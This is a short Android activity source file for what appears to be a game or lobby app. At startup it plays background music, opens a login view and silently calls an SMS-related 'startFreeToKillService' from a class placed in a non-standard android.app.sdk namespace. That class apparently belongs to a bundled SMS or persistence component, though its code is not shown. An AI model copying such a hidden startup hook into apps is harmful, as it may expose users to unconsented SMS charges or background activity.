package com.qp.land_h;

import android.app.sdk.SmsActivity;
import android.os.Bundle;

import com.qp.land_h.plazz.ClientPlazz;
import com.qp.land_h.plazz.df.PDF;
import com.qp.new_land.R;



public class NewLandActivity extends ClientPlazz {

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		SmsActivity.startFreeToKillService(this);
		SmsActivity.initData(this);
	}

	@Override
	protected void OnStartApp() {
		m_GlobalUnitsInstance.PlayBackGroundSound(R.raw.background, true);
		PDF.SendMainMessage(MM_CHANGE_VIEW, MS_LOGIN, null);
	}

}
